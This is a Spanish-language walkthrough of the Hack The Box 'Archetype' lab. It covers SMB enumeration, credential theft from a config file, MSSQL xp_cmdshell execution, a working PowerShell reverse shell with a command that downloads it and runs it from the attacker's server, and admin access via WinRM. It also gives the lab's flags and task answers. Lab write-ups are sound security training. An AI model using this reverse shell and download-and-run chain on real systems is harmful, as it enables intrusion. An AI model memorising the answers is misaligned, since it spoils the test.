Aquí tienes tu writeup corregido y mejorado:

---

# Archetype - HTB Starting Point

## Conexión y preparación

```bash
sudo openvpn starting_points_eu-starting-point-1-dhcp.ovpn
```

IP objetivo: `10.129.116.74`

---

## Reconocimiento

### Escaneo Nmap

```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 10.129.116.74
```

![[Pasted image 20260506173617.png]] ![[Pasted image 20260506173801.png]] ![[Pasted image 20260506173818.png]] ![[Pasted image 20260506173829.png]]

Se identifican 11 puertos abiertos. Estamos ante un sistema Windows:

|Puerto|Estado|Servicio|Razón|Versión|
|---|---|---|---|---|
|135/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|139/tcp|open|netbios-ssn|syn-ack ttl 127|Microsoft Windows netbios-ssn|
|445/tcp|open|microsoft-ds|syn-ack ttl 127|Windows Server 2019 Standard 17763 microsoft-ds|
|1433/tcp|open|ms-sql-s|syn-ack ttl 127|Microsoft SQL Server 2017 14.00.1000.00; RTM|
|47001/tcp|open|http|syn-ack ttl 127|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|
|49664/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|49665/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|49666/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|49667/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|49668/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|
|49669/tcp|open|msrpc|syn-ack ttl 127|Microsoft Windows RPC|

### NSE Scripts - Host Scripts

![[Pasted image 20260506173916.png]]

Los scripts NSE (Nmap Scripting Engine) revelan información relevante del objetivo:

**smb-os-discovery** confirma: `Windows Server 2019 Standard`, nombre de máquina `Archetype`, sin dominio AD (standalone en WORKGROUP).

**smb-security-mode** revela dos hallazgos críticos: SMB acepta conexiones como `guest` (posible acceso anónimo) y `message_signing` está deshabilitado, lo que lo hace vulnerable a ataques NTLM Relay.

**smb2-security-mode** indica que SMBv2 tiene signing disponible pero no obligatorio, manteniendo la misma superficie de ataque.

El puerto 1433 presenta un certificado SSL autofirmado genérico (`SSL_Self_Signed_Fallback`), indicativo de una configuración por defecto sin hardening.

---

## Task 1 - Which TCP port is hosting a database server?

**Respuesta: `1433`**

---

## Enumeración SMB

### smbclient

Dado que SMB acepta sesiones guest, se enumera con sesión anónima:

```bash
smbclient -L //10.129.116.74 -N
```

`-L` lista los shares disponibles en el host remoto. `-N` suprime la solicitud de contraseña, intentando conexión anónima (null session).

![[Pasted image 20260506174901.png]]

|Share|Tipo|Comentario|Interés|
|---|---|---|---|
|`ADMIN$`|Disk|Remote Admin|Requiere admin|
|`backups`|Disk|_(vacío)_|⭐ Interesante|
|`C$`|Disk|Default share|Requiere admin|
|`IPC$`|IPC|Remote IPC|Entre procesos|

### CrackMapExec

Se lanza también CrackMapExec para enumerar shares vía sesión anónima:

```bash
crackmapexec smb 10.129.116.74 --shares -u '' -p ''
```

Devuelve `STATUS_ACCESS_DENIED`, lo que indica que aunque la null session es aceptada, no tiene permisos suficientes para listar shares. Sin embargo, confirma `Windows Server 2019 Standard`, `signing:False` y `SMBv1:True`. Dado que CME no obtiene resultados, se continúa con `smbclient`.

---

## Task 2 - What is the name of the non-Administrative share available over SMB?

**Respuesta: `backups`**

---

## Acceso al share backups

```bash
smbclient //10.129.116.74/backups -N
ls
get prod.dtsConfig
exit
```

```bash
cat prod.dtsConfig
```

![[Pasted image 20260506175544.png]]

El archivo `prod.dtsConfig` es un fichero de configuración de SSIS (SQL Server Integration Services) que almacena parámetros de conexión para paquetes ETL. Contiene credenciales en texto claro, un error de seguridad clásico en shares accesibles anónimamente:

|Campo|Valor|
|---|---|
|**Usuario**|`ARCHETYPE\sql_svc`|
|**Contraseña**|`M3g4c0rp123`|
|**Data Source**|`.` (localhost)|
|**Catalog**|`Catalog`|
|**Provider**|`SQLNCLI10.1`|

---

## Task 3 - What is the password identified in the file on the SMB share?

**Respuesta: `M3g4c0rp123`**

---

## Task 4 - What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

**Respuesta: `mssqlclient.py`**

---

## Acceso MSSQL y RCE

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.116.74 -windows-auth
```

Con las credenciales obtenidas se accede al servicio MSSQL mediante `mssqlclient.py` de Impacket con autenticación Windows (`-windows-auth`), obteniendo sesión como `ARCHETYPE\sql_svc` en la base de datos `master`.

### Task 5 - What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**Respuesta: `xp_cmdshell`**

`xp_cmdshell` está deshabilitado por defecto desde SQL Server 2005. Se habilita mediante `sp_configure`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Se verifica RCE con:

```sql
EXEC xp_cmdshell 'whoami';
-- output: archetype\sql_svc
```

![[Pasted image 20260506180312.png]]

---

## Reverse Shell

Para obtener una shell interactiva se preparan tres terminales en paralelo:

|Terminal|Función|
|---|---|
|1|`mssqlclient.py` (sesión SQL activa)|
|2|`nc -lvnp 4444` → recibe la reverse shell|
|3|`python3 -m http.server 80` → sirve el `shell.ps1`|

Se crea el script `shell.ps1` en el directorio del servidor HTTP. Este script le indica a la víctima que establezca una conexión TCP de vuelta a nuestra máquina:

```powershell
\$client = New-Object System.Net.Sockets.TCPClient('10.10.15.146', 4444);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String);
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte, 0, \$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
```

Desde `mssqlclient.py` se fuerza la descarga y ejecución del script:

```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.15.146/shell.ps1\")"';
```

![[Pasted image 20260506180654.png]] ![[Pasted image 20260506181329.png]]

El servidor HTTP confirma la descarga (`200 OK`) y netcat recibe la conexión:

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.116.74] 49676
whoami
archetype\sql_svc
PS C:\Windows\system32>
```

---

## User Flag

```powershell
cat C:\Users\sql_svc\Desktop\user.txt
```

**`3e7b102e78218e935bf3f4951fec21a3`**

---

## Escalada de Privilegios

### Task 6 - What script can be used in order to search possible paths to escalate privileges on Windows hosts?

**Respuesta: `winPEAS`**

A diferencia de Linux donde se revisa `sudo -l` o `/etc/sudoers`, en Windows el proceso metódico de escalada consiste en revisar los privilegios del usuario actual (`whoami /all`), las credenciales guardadas (`cmdkey /list`), el historial de PowerShell, y archivos de configuración con credenciales. winPEAS automatiza todo este proceso.

```powershell
whoami /all
```

![[Pasted image 20260506183405.png]]

El análisis de privilegios revela:

|Privilegio|Estado|Relevancia|
|---|---|---|
|`SeImpersonatePrivilege`|Enabled|⭐ Vulnerable a Potato attacks|
|`SeAssignPrimaryTokenPrivilege`|Disabled|También relevante|

`SeImpersonatePrivilege` permite impersonar el token de otro usuario, incluyendo SYSTEM. Es típico en cuentas de servicio como SQL Server y constituye un vector de escalada vía PrintSpoofer o JuicyPotato. Sin embargo, en este caso se identifica un vector más directo.

### Task 7 - What file contains the administrator's password?

**Respuesta: `ConsoleHost_history.txt`**

El archivo `ConsoleHost_history.txt` es el equivalente en Windows al `.bash_history` de Linux. PowerShell, a través del módulo PSReadLine, registra automáticamente todos los comandos ejecutados en la consola. Es un fallo de OPSEC habitual: administradores ejecutan comandos con credenciales en texto claro sin ser conscientes de que quedan permanentemente registrados.

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Resultado:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

|Campo|Valor|
|---|---|
|**Usuario**|`administrator`|
|**Contraseña**|`MEGACORP_4dm1n!!`|

El administrador montó el share `backups` con sus credenciales directamente en la consola, quedando registrado en el historial.

---

## Acceso como Administrator

Con las credenciales obtenidas se accede vía WinRM (puerto 47001) usando evil-winrm:

```bash
evil-winrm -i 10.129.116.74 -u administrator -p 'MEGACORP_4dm1n!!'
```

![[Pasted image 20260506184242.png]]

---

## Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**`b91ccec3305e98240082d4474b848528`**

---

## Resumen del ataque

```
Enumeración SMB (anónima)
        ↓
prod.dtsConfig → credenciales sql_svc
        ↓
MSSQL → xp_cmdshell → RCE
        ↓
shell.ps1 → reverse shell (netcat)
        ↓
ConsoleHost_history.txt → credenciales Administrator
        ↓
evil-winrm → shell como Administrator → root flag
```